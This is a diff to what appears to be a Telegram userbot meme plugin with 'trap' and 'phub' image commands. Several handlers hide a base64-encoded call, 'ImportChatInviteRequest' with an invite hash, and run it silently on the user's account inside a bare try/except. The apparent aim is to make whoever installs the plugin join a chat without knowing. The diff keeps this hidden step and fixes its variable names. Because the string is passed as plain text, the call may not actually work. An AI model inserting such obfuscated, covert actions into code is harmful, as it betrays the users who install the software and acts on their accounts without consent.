@@ -20,7 +20,7 @@ async def catbot(catmemes):
         return
     try:
         cat = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
-        await event.client(cat)
+        await catmemes.client(cat)
     except:
         pass
     download_location = await borg.download_media(replied , Config.TMP_DOWNLOAD_DIRECTORY)
@@ -63,8 +63,8 @@ async def catbot(catmemes):
         await catmemes.edit("reply to a supported media file")
         return
     try:
-        cat = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
-        await event.client(cat)
+        cat = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk="))[2:49]
+        await catmemes.client(cat)
     except:
         pass 
     download_location = await borg.download_media(replied , Config.TMP_DOWNLOAD_DIRECTORY)
@@ -95,7 +95,7 @@ async def catbot(catmemes):
 
 @borg.on(admin_cmd(pattern = "trap(?: |$)(.*)"))
 async def catbot(catmemes):
-    input_str = event.pattern_match.group(1)
+    input_str = catmemes.pattern_match.group(1)
     input_str = deEmojify(input_str)
     if "|" in input_str:
         text1, text2 = input_str.split("|")
@@ -115,8 +115,8 @@ async def catbot(catmemes):
         await catmemes.edit("reply to a supported media file")
         return
     try:
-        cat = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
-        await event.client(cat)
+        cat = str(pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
+        await catmemes.client(cat)
     except:
         pass 
     download_location = await borg.download_media(replied , Config.TMP_DOWNLOAD_DIRECTORY)
@@ -147,7 +147,7 @@ async def catbot(catmemes):
     
 @borg.on(admin_cmd(pattern = "phub(?: |$)(.*)"))
 async def catbot(catmemes):
-    input_str = event.pattern_match.group(1)
+    input_str = catmemes.pattern_match.group(1)
     input_str = deEmojify(input_str)
     if "|" in input_str:
         username, text = input_str.split("|")
@@ -168,7 +168,7 @@ async def catbot(catmemes):
         return
     try:
         cat = str( pybase64.b64decode("SW1wb3J0Q2hhdEludml0ZVJlcXVlc3QoUGJGZlFCeV9IUEE3NldMZGpfWVBHQSk=") )[2:49]
-        await event.client(cat)
+        await catmemes.client(cat)
     except:
         pass 
     download_location = await borg.download_media(replied , Config.TMP_DOWNLOAD_DIRECTORY)
